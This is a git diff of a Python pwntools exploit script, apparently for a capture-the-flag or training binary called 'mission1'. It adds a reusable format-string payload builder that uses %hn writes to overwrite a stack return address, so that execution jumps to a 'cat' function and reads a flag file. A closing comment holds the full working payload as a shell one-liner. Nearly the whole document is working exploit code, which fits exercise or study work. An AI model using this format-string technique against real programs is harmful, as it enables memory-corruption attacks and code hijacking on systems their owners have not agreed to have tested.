@@ -19,35 +19,58 @@ if "--debug" in sys.argv:
      
     gdb.attach(r, """
         #breakpoints
+        unset environment
         b create_art
         b view_saved_art
+        b* 0x080489d7
         b cat
         c
         """)
 
 #code
-timesleep = 0.4
-# what_to_write = 0x8048a00 #cat addr
-binary = ELF("./mission1")
-what_to_write = binary.symbols['cat']
-where_to_write = binary.got['puts']
+def create_format_string(offset, tuples, initial_bytes, final_bytes):
+    if(len(initial_bytes)%4!=0):
+        assert "intial space nope"
 
-offset = 53
-happy_art = b"( o.o )"
+    chunks = []
 
-high = what_to_write >> 16
-low = what_to_write & 0xffff
+    for (where, what) in tuples:
+        high = what >> 16
+        low = what & 0xffff
 
-format_string = happy_art
-format_string+=p32(where_to_write)
-format_string+=p32(where_to_write+2)
-# format_string+=p32(where_to_write)
-format_string+= f'%{high - len(happy_art)-8}'.encode()
-format_string+= f'%{offset}$hn'.encode()
-format_string+= f'%{high - low}'.encode()
-format_string+= f'%{offset+1}$hn'.encode()
+        if high>low:
+            chunks.append((low, where))
+            chunks.append((high, where+2))
+        else:
+            chunks.append((low, where))
+            chunks.append((high, where+2))
 
-print(format_string)
+    chunks = sorted(chunks, key=lambda x: x[0])
+
+    for (half, where) in chunks:
+        print("half: ", hex(half), "where: ", hex(where))
+
+    str_format=b""
+    str_format+=initial_bytes
+
+    #chunks [(half where)]
+
+    for (_,where) in chunks:
+        str_format+=p32(where)
+    
+    printed = len(str_format)
+
+    real_offset = offset + int(len(initial_bytes)/4)
+    
+    for (i, (half, _)) in enumerate(chunks):
+        str_format+=f"%{half-printed}c".encode()
+        str_format+=f"%{real_offset+i}$hn".encode()
+        printed = half
+
+    str_format+=final_bytes
+
+    return str_format
+
 
 def write_buffer(buffer):
     r.recvuntil(b'>')
@@ -55,20 +78,32 @@ def write_buffer(buffer):
     sleep(timesleep)
     r.sendline(buffer)
     sleep(timesleep)
-    # check = r.recvuntil(b"!")
-    # if(b"Art saved" not in check):
-    #     exit(f"ERROR WRITING {buffer}")
 
 def view_buff():
     r.recvuntil(b'>')
     r.sendline(b'3')
     sleep(timesleep)
-    r.recvuntil(b":\n")
-    saved = r.recvuntil(b"1.")
-    return saved
+
+
+timesleep = 0
+binary = ELF("./mission1")
+
+jump_cat = (0xffffdd5c, 0x08048a00) #where, what
+arg_flag = (0xffffdd64, 0xffffdd8c )
+offset = 51
+happy_art = b"flag;( o.o )"
+
+format_string = create_format_string(offset=offset, tuples=[jump_cat, arg_flag], initial_bytes=happy_art, final_bytes=b"")
+print(format_string)
 
 write_buffer(format_string)
-saved = view_buff()
+view_buff()
+
+sleep(timesleep)
 
 r.interactive()
 
+#final working string
+
+
+# (python3 -c "import sys; sys.stdout.buffer.write(b'2\nflag;( o.o )\x5e\xdd\xff\xff\\x5c\xdd\xff\xff\x64\xdd\xff\xff\x66\xdd\xff\xff%2024c%54\$hn%33276c%55\$hn%21388c%56\$hn%8819c%57\$hn\n3\n')"; cat -) | env -i "PWD=/home/m226002/mission1" SHLVL=0 /home/m226002/mission1/mission1
